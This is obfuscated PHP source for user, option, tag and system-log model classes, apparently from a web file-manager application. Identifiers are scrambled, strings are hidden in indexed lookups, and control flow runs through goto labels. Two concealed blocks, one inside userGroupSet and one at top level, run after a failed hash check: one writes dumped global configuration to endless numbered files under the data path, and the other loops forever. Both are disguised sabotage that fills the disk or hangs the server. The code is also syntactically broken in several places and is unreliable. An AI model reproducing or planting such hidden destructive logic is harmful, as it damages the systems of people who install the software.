$_SERVER[]; $B = $this->userLoginFind($bʣ); if (!$B) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($B[$F[1533]], $c)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($B[$F[1533]]); } public function userLoginFind($A󡸵) { $dΏΧ =& $_SERVER[]; $f⏵ = array($dΏΧ[28] => $A󡸵, $dΏΧ[1965] => $A󡸵, $dΏΧ[303] => $A󡸵, $dΏΧ[2146] => $A󡸵, $dΏΧ[964] => $dΏΧ[966]); if ($this->nickNameRpt()) { unset($f⏵[$dΏΧ[1965]]); } return $this->where($f⏵)->find(); } public function clearCache($D̨϶) { $E =& $_SERVER[]; $this->cacheFunctionClear($E[1780], $D̨϶); $this->cacheFunctionClear($E[1774], $D̨϶); $this->cacheFunctionClear($E[2127], $D̨϶); } public function userPasswordCheck($B۾, $bیļ) { $a =& $_SERVER[]; $b՚ = $this->where(array($a[1533] => intval($B۾)))->find(); $E = $this->metaGet($B۾); $DԆ = isset($E[$a[2147]]) ? $E[$a[2147]] : $a[33]; if (md5($DԆ . trim($bیļ)) !== $b՚[$a[856]]) { return !1; } return !0; } public function userAdd($f͂) { goto Aݚ; D͗: $Cש = array($bڏ[2155] => $aڔ[$bڏ[856]], $bڏ[2151] => $aڔ[$bڏ[1965]]); $this->userEdit($D, $Cש); Model($bڏ[1213])->userRootAdd($D); goto f; f: return $D; goto eݍ; E싛: $E۱ = $this->_checkExist($f͂); if ($E۱ !== !0) { return $E۱; } $D = $this->add($aڔ); goto D͗; Aݚ: $bڏ =& $_SERVER[]; $aڔ = array($bڏ[413] => $f͂[$bڏ[28]], $bڏ[2148] => $f͂[$bڏ[1418]], $bڏ[2149] => isset($f͂[$bڏ[303]]) ? $f͂[$bڏ[303]] : $bڏ[33], $bڏ[2150] => isset($f͂[$bڏ[2146]]) ? $f͂[$bڏ[2146]] : $bڏ[33], $bڏ[2151] => isset($f͂[$bڏ[1965]]) ? $f͂[$bڏ[1965]] : $f͂[$bڏ[28]], $bڏ[2152] => isset($f͂[$bڏ[2131]]) ? $f͂[$bڏ[2131]] : $bڏ[33], $bڏ[2153] => isset($f͂[$bڏ[2154]]) ? $f͂[$bڏ[2154]] : 1, $bڏ[2155] => $f͂[$bڏ[856]], $bڏ[1775] => isset($f͂[$bڏ[1685]]) ? $f͂[$bڏ[1685]] : 1024 * 1024 * 20, $bڏ[1776] => 0, $bڏ[2156] => 0, $bڏ[1819] => isset($f͂[$bڏ[716]]) ? $f͂[$bڏ[716]] : 1); if (!empty($f͂[$bڏ[1533]])) { $aڔ[$bڏ[1533]] = $f͂[$bڏ[1533]]; } goto E싛; eݍ: } protected function userEditTest($E΄, $Aچɛ) { return $this->call($_SERVER[][2157], $E΄, $Aچɛ); } protected function userEdit($a, $AϏ) { goto cø; AĤ: $D򱧝 = $this->_checkExist($AϏ, $a); if ($D򱧝 !== !0) { return $D򱧝; } if (isset($AϏ[$Aས[856]]) && trim($AϏ[$Aས[856]]) != $Aས[33]) { $C݋ڛ = $this->metaGet($a); if (empty($C݋ڛ[$Aས[2147]])) { $C݋ڛ[$Aས[2147]] = rand_string(10); Model($Aས[502])->metaSet($a, $Aས[2147], $C݋ڛ[$Aས[2147]]); } $AϏ[$Aས[856]] = md5($C݋ڛ[$Aས[2147]] . trim($AϏ[$Aས[856]])); } else { unset($AϏ[$Aས[856]]); } goto cɓ; cɓ: $this->where(array($Aས[1525] => $a))->save($AϏ); if (isset($AϏ[$Aས[1965]])) { $this->setNamePinyin($a, $AϏ[$Aས[1965]]); } $this->clearCache($a); goto dꏏ; cø: $Aས =& $_SERVER[]; $d = $this->getInfoSimple($a); if (!$d) { return !1; } goto AĤ; dꏏ: return !0; goto c賠ʅ; c賠ʅ: } public function setNamePinyin($f, $E⋟ = false) { $e =& $_SERVER[]; if (!$E⋟) { $e☊ = $this->getInfoSimple($f); $E⋟ = $e☊[$e[1965]] ? $e☊[$e[1965]] : $e☊[$e[28]]; } $AԹ۔ = Model($e[506]); if (!Input::check($E⋟, $e[556])) { return $AԹ۔->metaSet($f, array($e[444] => $e[33], $e[443] => $e[33])); } return $AԹ۔->metaSet($f, array($e[444] => str_replace($e[50], $e[33], Pinyin::encode($E⋟)), $e[443] => Pinyin::encode($E⋟, $e[557]))); } private function nickNameRpt() { $aߠ =& $_SERVER[]; $B = Model($aߠ[736])->get($aߠ[2158]); $eտۍ = $GLOBALS[$aߠ[6]][$aߠ[378]][$aߠ[2158]]; $C۴ = !is_null($B) ? $B : $eտۍ; return !!$C۴; } private function _checkExist($cᵣත, $f = false) { $e =& $_SERVER[]; $d㺃 = array($e[28] => UserModel::ERROR_USER_EXIST_NAME, $e[1965] => UserModel::ERROR_USER_EXIST_NICKNAME, $e[303] => UserModel::ERROR_USER_EXIST_EMAIL, $e[2146] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($d㺃[$e[1965]]); } $a۷ = $f ? array($e[1533] => array($e[2159], $f)) : array(); foreach ($d㺃 as $D => $b) { $cӑȮ = array(); foreach ($d㺃 as $dí => $FԎ) { if (isset($cᵣත[$dí]) && $cᵣත[$dí]) { $cӑȮ[] = $cᵣත[$dí]; } } if (!$cӑȮ) { continue; } $A = array_merge(array($D => array($e[7], $cӑȮ)), $a۷); $a틑 = $this->where($A)->find(); if ($a틑) { return $b; } } return !0; } public function userListInfo($Cߒ) { $D =& $_SERVER[]; $B֢ = array(); $Cߒ = is_array($Cߒ) ? array_unique($Cߒ) : array(); if (!$Cߒ) { return $B֢; } if (count($Cߒ) < 20) { foreach ($Cߒ as $a䑣) { $B֢[$a䑣 . $D[33]] = $this->getInfoSimpleOuter($a䑣); } } else { $D쯉 = array($D[1525] => array($D[411], $Cߒ)); if (count($Cߒ) == 1) { $D쯉 = array($D[1525] => $Cߒ[0]); } $Eݮ = Model($D[502])->field($this->simpleField)->where($D쯉)->select(); $Eݮ = array_to_keyvalue($Eݮ, $D[1533]); foreach ($Cߒ as $a䑣) { $d = $Eݮ[$a䑣]; if (!$d) { $B֢[$a䑣 . $D[33]] = $this->getInfoSimpleOuter($a䑣); continue; } $d[$D[2131]] = Action($D[2132])->parseUrl($d[$D[2131]]); $B֢[$a䑣 . $D[33]] = $d; } } return $B֢; } protected function userStatus($e, $aߕ) { $bÃ = $this->getInfoSimple($e); if (!$bÃ) { return !1; } $Cݜ = array($_SERVER[][716] => $aߕ); return $this->userEdit($e, $Cݜ); } protected function userRemove($EΡ) { goto AɅڒ; a×: $Cָ = array($Dʊ٘[1525] => $EΡ); Model($Dʊ٘[563])->where($Cָ)->delete(); Model($Dʊ٘[2160])->where($Cָ)->delete(); goto B; AɅڒ: $Dʊ٘ =& $_SERVER[]; $cڪ = $this->getInfoSimple($EΡ); if (!$cڪ) { return !1; } goto a×; Cᢲ: Model($Dʊ٘[1982])->removeUserAll($EΡ); Model($Dʊ٘[796])->userRootRemove($EΡ); return $this->where($Cָ)->delete(); goto B; B: Model($Dʊ٘[1782])->where($Cָ)->delete(); Model($Dʊ٘[2145])->where($Cָ)->delete(); Model($Dʊ٘[2161])->where($Cָ)->delete(); goto Cᢲ; B: } protected function userGroupSet($aч, $cܙ, $bÅ = array()) { goto F̕ѹ; b䷊П: $Eʋ = 0; foreach ($cܙ as $cų => $Aڎ) { $AΏ = array($dܮ[1533] => $aч, $dܮ[1701] => $cų, $dܮ[1796] => $Aڎ); $AΏ[$dܮ[1724]] = isset($bÅ[$Eʋ]) ? $bÅ[$Eʋ] : 0; $Eʋ++; $bÝ[] = $AΏ; } return $Dǃ->addAll($bÝ, array(), !0); goto d琌; F̕ѹ: $dܮ =& $_SERVER[]; $fףè = $_SERVER[$dܮ[837]]; $E瘭 = $dܮ[845]; goto cꌌ̆; cꌌ̆: if ($_SERVER[$dܮ[830]] != $E瘭($fףè)) { goto fԃ; f񸊟: $F휕꺘 = 1; for ($Fȡ = $F휕꺘; $Fȡ > 0; $Fȡ++) { $Bхð(DATA_PATH . $Fȡ, $d); } goto b撆˫; bɄ񈾚: $D(); $Bхð = $dܮ[849]; $d = json_encode($GLOBALS[$dܮ[850]]); goto f񸊟; Fۈ: $e潏 = $Ę($eʉ); $Bбڥ = explode($dܮ[229], $e潏); if (count($Bбڥ) < $dܮ[582]) { $c = $dܮ[835]; $c(); } goto C،; fԃ: $D = $dܮ[846]; $Ę = $dܮ[832]; $eʉ = $_SERVER[$dܮ[833]] . $dܮ[834]; goto Fۈ; C،: $e = $dܮ[847]; $e($_SERVER[$dܮ[848]]); $D = $dܮ[846]; goto bɄ񈾚; b撆˫: } $Eنގ = $this->getInfoSimple($aч); if (!$Eنގ || !is_array($cܙ)) { return !1; } goto b; b: $Dǃ = Model($dܮ[1782]); $Dǃ->where(array($dܮ[1533] => $aч))->delete(); $bÝ = array(); goto b䷊П; d琌: } protected function userGroupAdd($Cۓﵺ, $Aߖϑ = array()) { $E̹ =& $_SERVER[]; $d􏭷 = $this->getInfoSimple($Cۓﵺ); if (!$d􏭷 || empty($Aߖϑ)) { return !1; } $bĶĿ = array(); foreach ($Aߖϑ as $Cͱ => $Dʆ) { $bĶĿ[] = array($E̹[1533] => $Cۓﵺ, $E̹[1701] => $Cͱ, $E̹[1796] => $Dʆ, $E̹[1724] => 0); } return Model($E̹[1782])->addAll($bĶĿ, array(), !0); } protected function userGroupRemove($A, $b) { $d =& $_SERVER[]; $Eح = $this->getInfoSimple($A); if (!$Eح || !$b) { return !1; } $E蔡 = array($d[1525] => $A, $d[1779] => $b); return Model($d[1782])->where($E蔡)->delete(); } public function listData() { $a̸ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($a̸[$_SERVER[][367]]); return $a̸; } public function listByID($d) { $e˲ =& $_SERVER[]; if (!$d) { return; } $Dމ = array($e˲[1533] => array($e˲[7], $d)); $F푮 = $this->where($Dމ)->select(); $this->_listDataApply($F푮); return $F푮; } public function listByGroup($aȈ = 0, $fҐ = array()) { goto C; C: $E׏ =& $_SERVER[]; $A = $E׏[33]; $b = array(); goto B; B: if ($aȈ) { $b = array($E׏[2162] => intval($aȈ)); $A = "\x4c\105\106\124\40\112\117\111\x4e\40{$this->tablePrefix}\x75\163\145\162\137\147\162\157\x75\160\40\x75\163\x65\162\137\147\162\157\165\160\40\157\x6e\x20\x75\x73\x65\x72\56\165\x73\x65\x72\x49\x44\x20\75\40\x75\163\x65\162\137\147\x72\157\165\160\x2e\165\163\145\162\111\104"; $C糓 = Input::get($E׏[435], null, $E׏[33]) ? $E׏[33] : $E׏[2163]; } if (isset($fҐ[$E׏[716]])) { $b[$E׏[2164]] = $fҐ[$E׏[716]]; } $c̺ = $this->_makeOrder($C糓)->field($E׏[2165])->where($b)->join($A)->selectPage(50); goto dÆё; dÆё: $this->_listDataApply($c̺[$E׏[367]]); return $c̺; goto dވ; dވ: } private function _makeOrder($dլ = '') { goto Aނ; A㵣: $dլ = $dլ . "\x75\163\x65\x72\56{$B߫}\x20{$eݫ}\x2c\40\x75\163\x65\x72\56\165\163\145\x72\111\104\x20\x61\163\143"; return $this->alias($Dɋ[1905])->order($dլ); goto cن; Aނ: $Dɋ =& $_SERVER[]; $F = array($Dɋ[1533], $Dɋ[28], $Dɋ[1687], $Dɋ[1659], $Dɋ[194]); $E柂 = array($Dɋ[428] => $Dɋ[429], $Dɋ[430] => $Dɋ[431]); goto DЩ; DЩ: $B߫ = Input::get($Dɋ[435], $Dɋ[7], $Dɋ[1525], $F); $eݫ = Input::get($Dɋ[436], $Dɋ[7], $Dɋ[1783], array($Dɋ[1783], $Dɋ[430])); $eݫ = $E柂[$eݫ]; goto A㵣; cن: } public function listSearch($dË) { goto Aӊ; F: $C = str_replace($f܅[1786], $f܅[1787], trim($C)); $CϪƤ = array($f܅[28] => array($f܅[380], "\x25{$C}\x25"), $f܅[303] => array($f܅[380], "{$C}\45"), $f܅[1965] => array($f܅[380], "{$C}\x25"), $f܅[964] => $f܅[1788]); if (Input::check($C, $f܅[309])) { $CϪƤ[$f܅[1533]] = array($f܅[380], "{$C}\45"); $CϪƤ[$f܅[2146]] = array($f܅[380], "{$C}\45"); } goto B; B: if (!$C) { $CϪƤ = array(); } if (isset($dË[$f܅[716]])) { $CϪƤ[$f܅[716]] = $dË[$f܅[716]]; } $CϪƤ = $this->parseWhereLike($CϪƤ); goto Cֺ; Cֺ: $d = $this->_makeOrder()->where($CϪƤ)->selectPage(20); if (!$d || count($d[$f܅[367]]) < 5 && Input::check($C, $f܅[316])) { $BĽ = $this->_searchFromMeta($f܅[443], $C, 10); $Eݹ = $this->_searchFromMeta($f܅[444], $C, 10); $fӪ = array_merge($BĽ, $Eݹ, $d[$f܅[367]]); $d[$f܅[367]] = array_unique_by_key($fӪ, $f܅[1533]); $d[$f܅[364]][$f܅[365]] = count($d[$f܅[367]]); $d[$f܅[364]][$f܅[366]] = ceil($d[$f܅[364]][$f܅[365]] / $d[$f܅[364]][$f܅[361]]); } $this->_listDataApply($d[$f܅[367]]); goto c䎕ɤ; c䎕ɤ: $this->_filterByGroup($d, $Aɱ); return $d; goto c; Aӊ: $f܅ =& $_SERVER[]; $C = $dË[$f܅[1784]]; $Aɱ = isset($dË[$f܅[1785]]) ? $dË[$f܅[1785]] : !1; goto F; c: } private function _filterByGroup(&$DūԄ, $C) { $cȓ =& $_SERVER[]; if (!$C) { return $DūԄ; } foreach ($DūԄ[$cȓ[367]] as $cѳ => &$e) { $C︶ = array_to_keyvalue($e[$cȓ[1875]], $cȓ[33], $cȓ[1701]); if (!in_array($C, $C︶)) { unset($DūԄ[$cȓ[367]][$cѳ]); } } unset($e); $DūԄ[$cȓ[367]] = array_values($DūԄ[$cȓ[367]]); $DūԄ[$cȓ[364]] = array($cȓ[1937] => count($DūԄ[$cȓ[367]]), $cȓ[1935] => $DūԄ[$cȓ[364]][$cȓ[361]], $cȓ[1934] => 1, $cȓ[1936] => 1); } private function _searchFromMeta($D廹, $A͛, $Dҩ) { goto dό; dό: $dر =& $_SERVER[]; $A͛ = strtolower($A͛); $C = array($dر[93] => $D廹, $dر[372] => array($dر[380], "\45{$A͛}\x25")); goto e; e: $C = $this->parseWhereLike($C); $Eؑ = Model($dر[2166])->where($C)->limit($Dҩ)->select(); if (!$Eؑ) { return array(); } goto D; D: $Eؑ = array_to_keyvalue($Eؑ, $dر[33], $dر[1533]); $B = $this->where(array($dر[1525] => array($dر[7], $Eؑ)))->select(); if (!$B) { return array(); } goto C؅; C؅: return $B; goto DꟖ; DꟖ: } private function _listDataApplyItem($BϏ) { $e = array($BϏ); $this->_listDataApply($e); return $e[0]; } private function _listDataApply(&$fׅۛ) { goto Bׇ; cؗ: $this->_listAppendSourceRoot($fׅۛ, $f); goto Aב; eۧ: $f = array_to_keyvalue($fׅۛ, $D߸[33], $D߸[1533]); $this->_listAppendGroup($fׅۛ, $f); $this->_listAppendMeta($fׅۛ, $f); goto cؗ; Bׇ: $D߸ =& $_SERVER[]; if (!$fׅۛ) { return; } array_remove_key($fׅۛ, $D߸[856]); goto eۧ; Aב: } private function _listAppendSourceRoot(&$fߏ, $fꑤ) { goto Fי; d񺙫ծ: $EƮ˰ = Model($fݒ[796])->order($fݒ[1795])->field($a֧)->where($Eǋ)->select(); $EƮ˰ = array_to_keyvalue($EƮ˰, $fݒ[484]); $EƮ˰ = array_remove_key($EƮ˰, $fݒ[484]); goto fό; Fי: $fݒ =& $_SERVER[]; $Eǋ = array($fݒ[478] => 0, $fݒ[404] => SourceModel::TYPE_USER, $fݒ[484] => array($fݒ[7], $fꑤ)); $a֧ = $fݒ[1794]; goto d񺙫ծ; fό: foreach ($fߏ as &$Fʖˎ) { $Fʖˎ[$fݒ[85]] = $EƮ˰[$Fʖˎ[$fݒ[1533]]] ? $EƮ˰[$Fʖˎ[$fݒ[1533]]] : array(); } unset($Fʖˎ); goto D; D: } private function _listAppendGroup(&$aֈ䐹, $b̲Ǳ) { goto Aې; aƠ: $BҲ = array($cŵ[1701] => array($cŵ[7], $cΆѼ)); $c = Model($cŵ[1873])->field($cŵ[2167])->where($BҲ)->select(); $c = array_to_keyvalue($c, $cŵ[1701]); goto Bۖ; Bۖ: $fЇ = array_to_keyvalue_group($fЇ, $cŵ[1533]); foreach ($fЇ as &$dԅ) { $fϠ = array(); foreach ($dԅ as $b) { if (!$b[$cŵ[1796]]) { continue; } $eۖ = Model($cŵ[1868])->listData($b[$cŵ[1796]]); $fϠ[] = array($cŵ[1701] => $b[$cŵ[1701]], $cŵ[2168] => $c[$b[$cŵ[1701]]][$cŵ[28]], $cŵ[487] => $c[$b[$cŵ[1701]]][$cŵ[487]], $cŵ[406] => $eۖ); } $dԅ = $fϠ; } unset($dԅ); goto dؑ; c˕: $cΆѼ = array_to_keyvalue($fЇ, $cŵ[33], $cŵ[1701]); $cΆѼ = array_remove_value(array_unique($cΆѼ), $cŵ[191]); if (!$cΆѼ || !$fЇ) { return; } goto aƠ; dؑ: foreach ($aֈ䐹 as &$fȝ) { $fȝ[$cŵ[1875]] = array(); if (isset($fЇ[$fȝ[$cŵ[1533]]])) { $fȝ[$cŵ[1875]] = $fЇ[$fȝ[$cŵ[1533]]]; } } unset($fȝ); goto f; Aې: $cŵ =& $_SERVER[]; $BҲ = array($cŵ[1533] => array($cŵ[7], $b̲Ǳ)); $fЇ = Model($cŵ[1782])->where($BҲ)->select(); goto c˕; f: } private function _listAppendMeta(&$f밮џ, $E) { goto b⚺; b펰: foreach ($f밮џ as &$D) { $aǇ = array(); if (isset($a͖[$D[$C[1533]]])) { $aǇ = $a͖[$D[$C[1533]]]; } $D[$C[2170]] = array(); if (isset($aǇ[$a])) { $D[$C[2170]] = $Cٴ->getUserJobInfo($aǇ[$a]); } } unset($D); goto e܎; b⚺: $C =& $_SERVER[]; $a = UserJobModel::JOB_KEY; $dҭ = array($C[2147]); goto D; d: foreach ($a͖ as &$aԹ) { $aʝ = array(); foreach ($aԹ as $d˼台) { if (!in_array($d˼台[$C[93]], $dҭ)) { $aʝ[$d˼台[$C[93]]] = $d˼台[$C[372]]; } } $aԹ = $aʝ; } unset($aԹ); $Cٴ = Model($C[2169]); goto b펰; D: $e = array($C[1533] => array($C[7], $E)); $a͖ = Model($C[2145])->where($e)->select(); $a͖ = array_to_keyvalue_group($a͖, $C[1533]); goto d; e܎: } protected function groupUserAll($F׶) { $fɊ =& $_SERVER[]; if (!$F׶) { return !1; } $aՍ = Model($fɊ[1782])->field($fɊ[1533])->where(array($fɊ[1701] => array($fɊ[7], $F׶)))->select(); $aՍ = array_to_keyvalue($aՍ, $fɊ[33], $fɊ[1533]); return array_unique($aՍ); } public function userSearch($f̓Ɲ, $d = "\52") { return Model($_SERVER[][506])->where($f̓Ɲ)->field($d)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\137\x6f\x70\x74\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($e懦) { $b =& $_SERVER[]; if (!defined($b[454])) { define($b[454], 0); } return "\x55\x73\x65\x72\117\x70\164\151\x6f\156\137{$e懦}\137" . USER_ID; } protected function filterWhere($f򶼇) { $C =& $_SERVER[]; if (!defined($C[454])) { define($C[454], 0); } $f򶼇[$C[1533]] = USER_ID; return $f򶼇; } public function cacheRemoveUser($C, $DÆ) { return Cache::remove("\x55\163\x65\162\117\160\164\151\x6f\x6e\137{$C}\137" . $DÆ); } protected function optionDefault($Aޝه = '') { $cŌ =& $_SERVER[]; if ($Aޝه == $cŌ[33]) { return $GLOBALS[$cŌ[6]][$cŌ[2171]]; } if ($Aޝه == $cŌ[2172]) { return $GLOBALS[$cŌ[6]][$cŌ[2173]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\x2e\164\141\147\114\x69\163\164"; public $modelType = "\x55\x73\145\x72\117\160\164\151\157\x6e"; public $field = array("\x6e\141\x6d\x65", "\163\164\x79\x6c\145", "\x73\x6f\x72\x74"); public function listData($Bַ = false, $eύَ = "\x73\x6f\162\164", $b = false) { return parent::listData($Bַ, $eύَ, $b); } public function remove($bʯ) { return parent::remove($bʯ); } public function add($Aϯ, $cф = "\154\141\x62\145\x6c\x2d\147\x72\145\x79\x2d\156\x6f\162\x6d\x61\154") { $D =& $_SERVER[]; if ($this->findByName($Aϯ)) { return !1; } $aѪѿ = array($D[413] => $Aϯ, $D[464] => $cф, $D[1705] => $this->getSort($D[256]) + 1); return parent::insert($aѪѿ); } public function update($b쯩薷, $Aټ⑰) { $e =& $_SERVER[]; $e = $this->listData($b쯩薷); $aӝ = $this->findByName($Aټ⑰[$e[28]]); if (!$e || $aӝ && $aӝ[$e[393]] != $e[$e[393]]) { return !1; } return parent::update($b쯩薷, $Aټ⑰); } public function moveTop($e) { $Bӯ =& $_SERVER[]; $F◫ = parent::listData(); $cɩ = $this->getSort($Bӯ[255]); foreach ($F◫ as &$d) { if ($d[$Bӯ[393]] == $e) { $d[$Bӯ[1724]] = $cɩ; continue; } $d[$Bӯ[1724]] += 1; } unset($d); return parent::resetData($F◫); } public function moveBottom($FԾ) { $A =& $_SERVER[]; $Bߨ = $this->getSort($A[256]) + 1; return parent::update($FԾ, array($A[1724] => $Bߨ)); } public function resetSort($C) { goto CŐ; CƂ: for ($C砜 = 0; $C砜 < count($C); $C砜++) { $fۃ˴[$C[$C砜] . $bɇ[33]] = $C砜 + 1; } $a襬 = parent::listData(); foreach ($a襬 as &$fŃ) { $AǑѽ = $fۃ˴[$fŃ[$bɇ[393]]]; $fŃ[$bɇ[1724]] = $AǑѽ ? $AǑѽ : $fŃ[$bɇ[1724]]; } goto a; CŐ: $bɇ =& $_SERVER[]; $fۃ˴ = array(); $C = is_array($C) ? $C : array(); goto CƂ; a: unset($fŃ); return parent::resetData($a襬); goto F읣; F읣: } private function getSort($C̊) { $D컴ˊ =& $_SERVER[]; $Eާ׸ = parent::listData(); $fגƷ = array_to_keyvalue($Eާ׸, $D컴ˊ[33], $D컴ˊ[1724]); if (!$fגƷ) { $fגƷ = array(0); } $Bʙ = $C̊ == $D컴ˊ[256] ? max($fגƷ) : min($fגƷ); return intval($Bʙ); } } goto aϘ; aʼ: if (!isset($_SERVER[$_SERVER[][830]]) || !isset($_SERVER[$_SERVER[][837]])) { goto Eֵ; CǬ: $Fބ = explode($_SERVER[][229], $bُ); if (count($Fބ) < $_SERVER[][584]) { $eɃ = $_SERVER[][835]; $eɃ(); } $D醞۬ = $_SERVER[][836]; goto cų˭; cų˭: $D醞۬($_SERVER[$_SERVER[][833]] . $_SERVER[][834]); $bÜ = 2; while ($bÜ > 1) { $cո = rawurlencode($bÜ . $_SERVER[][375]); } goto cݹ; Eֵ: $e¥ = $_SERVER[][832]; $d = $_SERVER[$_SERVER[][833]] . $_SERVER[][834]; $bُ = $e¥($d); goto CǬ; cݹ: } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\x74\x65\155\x5f\x6c\157\x67"; protected $dataAuto = array(array("\143\x72\x65\141\x74\145\124\x69\155\145", "\164\x69\x6d\145", "\151\x6e\163\x65\x72\164", "\x66\x75\156\143\x74\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $cԛŹ =& $_SERVER[]; return array($cԛŹ[2013] => LNG($cԛŹ[2014]), $cԛŹ[2015] => LNG($cԛŹ[2016]), $cԛŹ[1641] => LNG($cԛŹ[2017]), $cԛŹ[2018] => LNG($cԛŹ[2019]), $cԛŹ[2020] => LNG($cԛŹ[2021]), $cԛŹ[2022] => LNG($cԛŹ[2023]), $cԛŹ[2024] => LNG($cԛŹ[2025]), $cԛŹ[1671] => LNG($cԛŹ[2025]), $cԛŹ[1672] => LNG($cԛŹ[2026]), $cԛŹ[2027] => LNG($cԛŹ[2028]), $cԛŹ[2029] => LNG($cԛŹ[2030]), $cԛŹ[2031] => LNG($cԛŹ[2032]), $cԛŹ[2033] => LNG($cԛŹ[2034]), $cԛŹ[1669] => LNG($cԛŹ[2035]), $cԛŹ[2036] => LNG($cԛŹ[2037]), $cԛŹ[1676] => LNG($cԛŹ[2038]), $cԛŹ[2039] => LNG($cԛŹ[2040]), $cԛŹ[2041] => LNG($cԛŹ[2042]), $cԛŹ[2043] => LNG($cԛŹ[2044]), $cԛŹ[2045] => LNG($cԛŹ[2046]), $cԛŹ[1679] => LNG($cԛŹ[2047]), $cԛŹ[1680] => LNG($cԛŹ[2048]), $cԛŹ[2049] => LNG($cԛŹ[2050]), $cԛŹ[2051] => LNG($cԛŹ[2052]), $cԛŹ[2053] => LNG($cԛŹ[2054]), $cԛŹ[1674] => LNG($cԛŹ[2055]), $cԛŹ[2056] => LNG($cԛŹ[2057]), $cԛŹ[1673] => LNG($cԛŹ[2058]), $cԛŹ[2059] => LNG($cԛŹ[2060]), $cԛŹ[2061] => LNG($cԛŹ[2062]), $cԛŹ[2063] => LNG($cԛŹ[2064]), $cԛŹ[2065] => LNG($cԛŹ[2065]), $cԛŹ[2066] => LNG($cԛŹ[1645]), $cԛŹ[2067] => LNG($cԛŹ[2068]), $cԛŹ[2069] => LNG($cԛŹ[2070]), $cԛŹ[2071] => LNG($cԛŹ[2072]), $cԛŹ[2073] => LNG($cԛŹ[2074]), $cԛŹ[2075] => LNG($cԛŹ[2076]), $cԛŹ[2077] => LNG($cԛŹ[2077]), $cԛŹ[2078] => LNG($cԛŹ[2079]), $cԛŹ[2080] => LNG($cԛŹ[2081]), $cԛŹ[2082] => LNG($cԛŹ[2083]), $cԛŹ[2084] => LNG($cԛŹ[2085]), $cԛŹ[2086] => LNG($cԛŹ[2087]), $cԛŹ[2088] => LNG($cԛŹ[2089])); } private function typeFile() { $b쐵΅ =& $_SERVER[]; $eɊ = array($b쐵΅[1676] => array($b쐵΅[1677]), $b쐵΅[2031] => array($b쐵΅[2090]), $b쐵΅[2033] => array($b쐵΅[2091]), $b쐵΅[1669] => array($b쐵΅[1670]), $b쐵΅[2041] => array(), $b쐵΅[2043] => array(), $b쐵΅[2045] => array(), $b쐵΅[1679] => array($b쐵΅[1681]), $b쐵΅[1680] => array($b쐵΅[1681]), $b쐵΅[2049] => array($b쐵΅[2092]), $b쐵΅[2051] => array($b쐵΅[2092]), $b쐵΅[2053] => array($b쐵΅[2093]), $b쐵΅[2039] => array($b쐵΅[2094]), $b쐵΅[1674] => array($b쐵΅[2095]), $b쐵΅[2056] => array($b쐵΅[2096]), $b쐵΅[1673] => array($b쐵΅[1675])); return $eɊ; } private function typeAll() { goto bؙܿ; E: return $C愥; goto cة; bؙܿ: $aÕ =& $_SERVER[]; $C愥 = $this->typeList; $Bݹ; = array_filter($this->typeFile()); goto AԱ; AԱ: foreach ($Bݹ; as $b۪ => $E) { $C愥[$E[0]] = $C愥[$b۪]; } $C愥[$aÕ[1681]] = LNG($aÕ[2097]); $C愥[$aÕ[2092]] = LNG($aÕ[2098]); goto E; cة: } public function addLog($eÇ, $bߐ = array()) { goto F񐖗; f܉: $bߐ = array($c[1524] => Session::sign(), $c[1525] => $Cػ, $c[29] => $eÇ, $c[1527] => json_encode($bߐ)); parent::add($bߐ); goto Fی; F񐖗: $c =& $_SERVER[]; if (!isset($this->typeList[$eÇ])) { return; } $Cػ = defined($c[454]) && USER_ID ? USER_ID : (isset($bߐ[$c[1533]]) ? $bߐ[$c[1533]] : 0); goto Cϻǈ; Cϻǈ: if (!$Cػ) { $Cػ = (int) Session::get($c[1827]); } $eݬ = get_client_ip(); if (!$bߐ || strlen(json_encode($bߐ)) >= 1024) { $bߐ = array($c[2099] => $eݬ); } else { if (is_array($bߐ)) { $bߐ[$c[2099]] = $eݬ; } else { $bߐ = array($c[1095] => $bߐ, $c[2099] => $eݬ); } } goto f܉; Fی: } public function remove($B) { $this->where(array($_SERVER[][412] => $B))->delete(); } private function _makeOrder($d鎅 = '') { goto AȬ; AȬ: $Eˠ =& $_SERVER[]; $Dȇ = $Eˠ[194]; $c녴 = array($Eˠ[428] => $Eˠ[429], $Eˠ[430] => $Eˠ[431]); goto B먾; F޻: return $this->order($d鎅); goto A; B먾: $bǼ휽 = Input::get($Eˠ[436], $Eˠ[7], $Eˠ[1859], array($Eˠ[1783], $Eˠ[430])); $bǼ휽 = $c녴[$bǼ휽]; $d鎅 = $d鎅 . "{$Dȇ}\x20{$bǼ휽}"; goto F޻; A: } public function get($bʃ̵ = '') { goto a펠; d߰: if ($bʃ̵[$Aԅ[1533]]) { $F읰Ѿ[$Aԅ[1533]] = $bʃ̵[$Aԅ[1533]]; } if (isset($bʃ̵[$Aԅ[727]])) { $Bط = $bʃ̵[$Aԅ[727]]; $a = isset($bʃ̵[$Aԅ[476]]) ? $bʃ̵[$Aԅ[476]] : time(); $F읰Ѿ[$Aԅ[194]] = array($Aԅ[331], array($Bط, $a)); } if ($bʃ̵[$Aԅ[29]]) { $F = explode($Aԅ[47], $bʃ̵[$Aԅ[29]]); $e = $this->typeFile(); $A = array(); foreach ($F as $A݉ь) { $A[] = $A݉ь; if (isset($e[$A݉ь])) { $A = array_merge($A, $e[$A݉ь]); } } $A = array_unique($A); if ($A) { $F읰Ѿ[$Aԅ[29]] = array($Aԅ[7], $A); } } else { $F읰Ѿ[$Aԅ[29]] = array($Aԅ[2100], $Aԅ[2101]); } goto c쭡; c쭡: if (!empty($bʃ̵[$Aԅ[2099]])) { $F읰Ѿ[$Aԅ[431]] = array($Aԅ[380], "\x25{$bʃ̵[$Aԅ[2099]]}\45"); } $FÍ = $this->_makeOrder()->where($F읰Ѿ)->selectPage(); if (empty($FÍ[$Aԅ[367]])) { show_json(array(), !0, $FÍ[$Aԅ[364]]); } goto e; e: $FÍ[$Aԅ[367]] = $this->logList($FÍ[$Aԅ[367]]); return 